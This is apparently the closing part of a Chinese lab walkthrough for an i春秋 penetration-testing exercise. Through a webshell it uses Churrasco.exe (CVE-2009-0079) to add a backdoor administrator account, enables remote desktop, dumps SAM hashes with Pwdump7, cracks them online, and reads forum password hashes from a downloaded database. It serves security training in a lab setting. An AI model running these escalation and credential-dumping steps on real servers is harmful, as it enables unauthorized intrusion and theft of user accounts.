![chopper_conn_old](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/chopper_conn_old.png)

**注意：以上发现的 SQL Server 数据库账号密码，与主站目前在用的 Microsoft Access 数据库无任何关系，只是作为考察信息检索能力的题目而存在。从文件名亦可得知，这是主站连接数据库的旧配置信息。**

此外，在 `/db/` 目录下发现了数据库文件，可见 `bear.asp` 与 `bear.ldb` 同名，并且 `bear.asp` 占用空间较大，由此推测为 `bear.mdb` 的备份数据库文件。

> 小贴士：[.LDB](https://support.microsoft.com/en-us/help/966848/what-is-an-ldb-file) 文件是打开 Microsoft Access 数据库文件 .MDB 时自动创建与删除的数据信息锁定文件，一般与 .MDB 文件同名，且位于同一目录，用于存储用户名与主机名等相关信息。

右击 `bear.asp` 将其下载至桌面，并改名为 `bear.mdb`。打开明小子注入工具，依次点击 **数据库管理 -> 文件 -> 打开数据库**，选中桌面上的 `bear.mdb` 文件后打开：

![domain_open_bear_mdb](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/domain_open_bear_mdb.png)

在数据库中发现了 `admin` 表，以及主站后台管理员「linhai」的账号密码，从而证实了 `bear.asp` 文件为主站的后台数据库。

![domain_bear_mdb](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/domain_bear_mdb.png)

# 0x04 目标服务器系统的管理员密码是？

终于到达最后一关：「获取目标服务器的管理员密码」，我们先倒推一下思路：**获得服务器系统管理员权限 -> 破解管理员的密码哈希值 -> 上传提权工具 -> 寻找上传点**，因此首先要做的是确定上传点！

那么如何确定上传点呢？具有写权限的目录都可以作为上传点，在 C 盘下的每个目录尝试上传，发现 `C:\Inetpub`、`C:\RECYCLER`、`C:\wmpub` 三个目录具有写权限，其他目录均写入失败。下面演示以 `C:\wmpub` 作为上传点。

系统提权将利用 [**CVE-2009-0079**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0079) 漏洞，采取 **cmd.exe + Churrasco.exe + 3389.bat** 的工具组合，其中 cmd.exe 是为了代替原服务器中权限受限的命令行交互环境，Churrasco.exe 是用于提权的漏洞利用工具（也可用 pr.exe 与 iis.exe 等提权工具代替），3389.bat 是打开 3389 端口及远程桌面服务的批处理脚本文件。

> 小贴士：CVE-2009-0079 是 Microsoft Windows RPCSS 服务隔离的本地权限提升漏洞，收录于 Microsoft 安全公告 [MS09-012](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-012)，影响 **Microsoft Windows Server 2003 SP2** 等多个系统版本。

首先将工具箱【提权工具】->【windows】目录中的三款工具，在菜刀的文件管理页面空白处，右键点击 **上传文件** 至服务器 `C:\wmpub` 目录下，接着右击 cmd.exe，选择 **虚拟终端** 进入到命令行交互界面：

![chopper_upload](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/chopper_upload.png)

输入 `systeminfo` 命令，获取服务器系统相关信息，得知系统为 Microsoft Windows Server 2003 Enterprise Edition SP2，且只安装了一个补丁程序，即可猜测该系统存在 CVE-2009-0079 漏洞：

![systeminfo](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/systeminfo.png)

接着切换到 `C:\wmpub` 目录，输入 `churrasco "net user ichunqiu key /add"` 命令，添加一个名为 `ichunqiu`、密码为 `key` 的用户：

![churrasco_user](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/churrasco_user.png)

再输入 `churrasco "net localgroup administrators ichunqiu /add"`命令，将 `ichunqiu` 用户添加到 `administrators` 用户组：

![churrasco_localgroup](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/churrasco_localgroup.png)

> 小贴士：可通过 `net user` 与 `net localgroup administrators` 查看命令是否执行成功。

最后输入 `churrasco 3389` 命令，打开 3389 端口及远程桌面服务：

![churrasco_3389](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/churrasco_3389.png)

确认提权成功后，在本机上点击 **开始 -> 运行**，输入 [`mstsc`](https://baike.baidu.com/item/mstsc)，远程计算机地址为 `172.16.12.2`（在实验场景拓扑图上可见）：

![mstsc](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/mstsc.png)

正常情况下会弹出远程桌面，输入用户名 `ichunqiu` 与密码 `key`，即可成功登录远程服务器：

![login_server](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/login_server.png)

进入到远程主机桌面，此时可以通过 [pwdump 工具](http://www.openwall.com/passwords/windows-pwdump) 获取管理员密码的哈希值，常见的 pwdump 工具有 Pwdump7、QuarksPwDump、Cain & Abel 等。

> 小贴士：[**pwdump**](https://en.wikipedia.org/wiki/Pwdump) 是一类能从 Windows [SAM（Security Account Manager）](https://en.wikipedia.org/wiki/Security_Account_Manager) 中读出本地用户 [LM（LAN Manager）](https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details) 与 [NTLM（NT LAN Manager）](https://en.wikipedia.org/wiki/NT_LAN_Manager) 密码哈希值的工具（注意必须在管理员权限下），其中 LM 与 NTLM 是 Windows 系统下的安全认证协议，并且 NTLM 是 LM 的演进版本，安全性更高。

下面以 [**Pwdump7**](http://www.tarasco.org/security/pwdump_7/index.html) 为例进行演示，先将实验工具箱【提权工具】->【hash】->【Pwdump7】文件夹下的 **Pwdump7.exe** 与 **libeay32.dll** 两个文件通过菜刀上传至服务器 `C:\wmpub` 目录，再回到远程主机桌面点击【开始】 -> 【我的电脑】，进入上传点打开 cmd.exe，直接输入 `pwdump7` 命令即可获得所有用户的密码哈希值，其中 `3C8D6C158F6FB3D1FDCFC2AFB2D1BE34` 是 LM 哈希，`594B9CD2577A5AC2BE0CA522D5EC6ACE` 是 NTLM 哈希：

![pwdump7](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/pwdump7.png)

 最后，打开在线哈希值破解工具 [Objectif Sécurité ](http://www.objectif-securite.ch/)，在主页点击 **OPHCRACK** 选项卡，将 NTLM 哈希 `594B9CD2577A5AC2BE0CA522D5EC6ACE` 填入第一个文本框，点击 **GO** 解密后，即得管理员系统密码的明文 `88hvpebv`：

![objectif](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/objectif.png)

# 0x05 文末彩蛋

当我们拥有了服务器管理员账号 `Administrator` 与密码 `88hvpebv` 后，可以打开上帝视角来回顾一下靶机渗透环境，对之前渗透过程中遇到的有趣现象有更深入的理解。

![login_server_admin](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/login_server_admin.png)

## 直接查看 SSMS 账户的密码？

进入到远程服务器的管理员桌面后，发现了数据库集成环境 **SQL Server Management Studio**，心想是否能直接通过该 IDE 查看到账户 `sa` 的密码呢？于是打开 SSMS，点击 **连接(C)** 进入数据库服务器，在 **ADMIN-508BF95B0 -> 安全性 -> 登录名** 路径下找到账户 `sa`：

![ssms_user](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/ssms_user.png)

双击 `sa` 账户，发现在登录属性中只能看到其密码的 `*` 号隐藏值：

![ssms_sa](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/ssms_sa.png)

搜索了许多相关资料后才知道，**只能通过 SSMS 修改密码，但不能查看原密码**，否则安全性怎么保证呢？想了想确实也是，因此账户 `sa` 的密码除了在主站数据库配置文件中作为敏感信息泄露外，目前暂无他法，若读者们找到了其他途径获得密码，还请分享交流。

## 「linhai」的论坛后台管理密码？

通过菜刀在主站 `/bbs/Data/` 目录下发现了数据库 `dtxy.mdb` 的备份文件 `dtxy.asp`，与上文类似，将其下载至桌面，并改名为 `dtxy.mdb`，点击右键查看其属性，**如果发现其大小为 0 字节，则说明下载失败。**此时若用明小子注入工具打开，则会**弹出输入数据库密码的提示，实际上是由于识别了无效的数据库文件**：

![dtxy_error](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/dtxy_error.png)

笔者在实验过程中时而下载成功，时而失败，原因至今不明。经过反复试验，这里提供两种解决方法，供大家参考：

### 将 dtxy.asp 复制到其他文件夹再下载

笔者尝试将 `dtxy.asp` 复制到其他文件夹中（如 `/bbs/Board/`），下载后发现其大小终于不为 0 字节，说明下载成功。

更有意思的是，将其他文件夹的文件（如 `/bbs/Board/Board.asp`）复制到  `/bbs/Data/`  中，也能正常下载。

因此，结论是**原本就在 `/bbs/Data/` 目录下的文件不能正常下载，至少刚开始连上菜刀的时候不行。**后面不知过了多久，经过了什么操作，又能够正常下载了。这一神奇的现象笔者至今无法理解，请有经验的前辈多多指点。

### 直接将明小子注入工具上传至服务器

另一种方法，是在成功提权的情况下，直接将明小子注入工具通过菜刀上传至服务器，即可在远程服务器内利用明小子查看任意数据库文件，避免了下载文件可能出错的问题。

### 获取论坛用户密码

通过以上两种方法，即可成功查看数据库 `dtxy.asp` 中的内容。双击 `LeadBBS_User` 表，即可看到论坛所有用户的相关信息：

![dtxy_user](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/dtxy_user.png)

其中，用户 `linhai` 的密码哈希值为 `e10adc3949ba59abbe56e057f20f883e`，解密后得到密码明文 `123456`：

![dtxy_linhai_password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/dtxy_linhai_password.png)

还可验证管理员用户 `Admin` 的密码哈希值 `21232f297a57a5a743894a0e4a801fc3`，解密后确实为 `admin`，与之前的猜测一致：

![dtxy_admin_password](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E7%BD%91%E7%AB%99%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C/dtxy_admin_password.png)

事实上，整个 Web 应用程序**最有价值**的就是这张表，里面包含所有用户的隐私信息，不仅能实现任意用户登录，而且还能通过撞库威胁其他 Web 应用上的账户，甚至利用钓鱼或社工手段骗取钱财。**因此，该表通常也是黑产的终极目标，也是互联网企业最核心的用户资产，其重要性不言而喻。**

# 0x06 小结

 本篇 writeup 是 **i春秋「渗透测试入门」系列实验**的最后一作，在前篇 writeup [【i春秋】渗透测试入门 —— 我很简单，请不要欺负我](https://ciphersaw.github.io/2018/03/20/%E3%80%90i%E6%98%A5%E7%A7%8B%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%20%E2%80%94%E2%80%94%20%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/) 的基础上，加强巩固了渗透测试过程中信息收集、社工运用、SQL 注入、上传图片木马、获取 webshell、权限提升、获取系统用户密码等技巧的使用。

笔者水平有限，希望自己的一点心得体会有助于各位读者加深对渗透测试的理解，在动手实践之后能更熟练地掌握渗透工具。最后向以下两篇参考 writeup 的作者致谢，欢迎各位指出不足之处，分享独特思路。

> [02-在线挑战详细攻略-《网站综合渗透实验》](https://bbs.ichunqiu.com/thread-1821-1-1.html)
> [ichunqiu在线挑战--网站综合渗透实验 writeup](https://www.cnblogs.com/renzongxian/p/4957762.html)